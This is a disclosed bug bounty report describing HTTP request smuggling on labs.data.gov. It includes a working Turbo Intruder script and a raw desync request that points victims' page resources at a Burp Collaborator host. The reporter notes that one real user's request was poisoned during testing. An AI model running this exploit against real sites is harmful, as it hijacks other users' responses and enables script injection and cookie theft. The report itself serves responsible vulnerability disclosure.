# HTTP Request Smuggling on https://labs.data.gov

## Report Details
- **Report ID**: 726773
- **URL**: https://hackerone.com/reports/726773
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-10-31T16:18:21.474Z
- **Disclosed**: 2020-05-13T16:28:01.942Z

## Reporter
- **Username**: puppykok
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gsa_bbp

## Vulnerability Information
Greetings,

The application appears to be vulnerable to HTTP request smuggling due to a disagreement between the front-end and back-end server, where the front-end server uses the Transfer-Encoding header to determine content in the HTTP body, but back-end server uses the Content-Length header, which causes a desync. The following steps outline how to reproduce this vulnerability:

The purpose of the following Turbo Intruder script is to send a desync request followed by 14 requests in quick succession to increase the chances of catching the desync-ed request such that it would not poison the request of another user who happens to be browsing the page.
```
import re

def queueRequests(target, wordlists):

    # to use Burp's HTTP stack for upstream proxy rules etc, use engine=Engine.BURP
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                           )
    engine.start()

    prefix = '''POST /hopefully404 HTTP/1.1
Host: o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1'''

    chunk_size = hex(len(prefix)).lstrip("0x")
    attack = target.req.replace('0\r\n\r\n', chunk_size+'\r\n'+prefix+'\r\n0\r\n\r\n')
    content_length = re.search('Content-Length: ([\d]+)', attack).group(1)
    attack = attack.replace('Content-Length: '+content_length, 'Content-length: '+str(int(content_length)+len(chunk_size)-3))
    engine.queue(attack)

    for i in range(14):
        engine.queue(target.req)
        time.sleep(0.05)


def handleResponse(req, interesting):
    table.add(req)
```
The following desync request issued to the server is shown below, where I changed the host header to my Burp's collaborator domain:
```
POST / HTTP/1.1
Host: labs.data.gov
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding : chunked

a2
POST /hopefully404 HTTP/1.1
Host: o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```
From the following screenshot, you can see that a 'victim' request was caught which redirected to a 404 page, just as intended, since `https://www.data.gov/hopefully404` does not actually exist. In addition, by searching for my Burp's collaborator URL, you can see that there are 67 instances where the URL is reflected, some within script tags and sources:
{F622456}

The following request is heavily shortened to show that the attacker's host URL is reflected in multiple critical areas within the victim's response:
``` 
-snip
<script type='application/ld+json' class='yoast-schema-graph yoast-schema-graph--main'>{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/#website","url":"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/","name":"Data.gov","potentialAction":{"@type":"SearchAction","target":"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/?s={search_term_string}","query-input":"required name=search_term_string"}}]}</script>
<!-- / Yoast SEO plugin. -->

-snip-

<link rel="stylesheet" href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/app/plugins/simple-tooltips/zebra_tooltips.css?ver=5.2.4">
<link rel="stylesheet" href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/app/plugins/the-events-calendar/common/src/resources/css/reset.min.css?ver=4.9.16">
<link rel="stylesheet" href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/app/plugins/the-events-calendar/common/src/resources/css/common.min.css?ver=4.9.16">
<link rel="stylesheet" href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/app/plugins/the-events-calendar/common/src/resources/css/tooltip.min.css?ver=4.9.16">
<link rel="stylesheet" href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/wp/wp-includes/css/dist/block-library/style.min.css?ver=5.2.4">

-snip-

<a class="dropdown-toggle local-link" data-toggle="dropdown" data-target="#" href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/communities/">Topics <b class="caret"></b></a>
<ul class="dropdown-menu topics">
	<li class="menu-agriculture topic-food"><a href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/food/" class="local-link"><i></i><span>Agriculture</span></a></li>
	<li class="menu-climate topic-climate"><a href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/climate/" class="local-link"><i></i><span>Climate</span></a></li>
	<li class="menu-consumer topic-consumer"><a href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/consumer/" class="local-link"><i></i><span>Consumer</span></a></li>
	<li class="menu-ecosystems topic-ecosystems"><a href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/ecosystems/" class="local-link"><i></i><span>Ecosystems</span></a></li>
	<li class="menu-education topic-education"><a href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/education/" class="local-link"><i></i><span>Education</span></a></li>
	<li class="menu-energy topic-energy"><a href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/energy/" class="local-link"><i></i><span>Energy</span></a></li>
	<li class="menu-finance topic-finance"><a href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/finance/" class="local-link"><i></i><span>Finance</span></a></li>
	<li class="menu-health topic-health"><a href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/health/" class="local-link"><i></i><span>Health</span></a></li>
```
Note that this attack is not reliable and we may fail to 'catch on' to the victim's request which might inadvertently affect an innocent user. During testing, there was one such case of this happening and the Burp Collaborator manages to posion someone from Los Angeles, California:
{F622459}
{F622460}
In order to prevent affecting more innocent users, I stopped further testing after coming with the above proof of concept which should be sufficent to proof the existence of the vulnerability. Please let me know if any additional information is needed and I will gladly provide.

## Impact

Since the javascript imports on the page can be determined by the attacker, he can host a malicious domain to steal user data, perform stored cross-site scripting and defacing the webpage for the user whos request was poisoned by the desynced request. In addition, I noticed there was a Wordpress login page but seems like it requires a specially-configured browser to access the SSO. My suspicion is that it is very likely that an attacker can steal authenticated cookies/headers which will be sent to an attacker-controlled server, although I am unable to verify (Can't get SSO to work on my browser).

## Attachments
- turbo1.png
- turbo2.png
- turbo3.png
